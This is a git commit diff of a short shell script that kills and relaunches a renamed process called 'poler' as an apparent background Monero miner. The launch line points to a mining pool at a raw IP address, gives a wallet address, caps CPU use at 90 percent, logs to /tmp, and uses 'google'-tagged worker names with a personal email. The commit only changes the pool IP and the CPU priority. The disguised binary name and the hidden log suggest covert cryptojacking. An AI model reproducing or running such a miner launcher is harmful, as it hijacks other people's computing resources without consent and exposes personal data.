93167ce0ace169f419eaaa55a085d6572da0d3d6
today100not <56802907+today100not@users.noreply.github.com>
2019-11-07 07:02:31 -0200

    Update 50.sh

--- 50.sh
+++ 50.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 15 -o 109.234.34.254:5522 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6 --pass=w151-google:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 7 -o 94.103.94.254:5522 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6 --pass=w152-google:robbertopp1@gmail.com -k
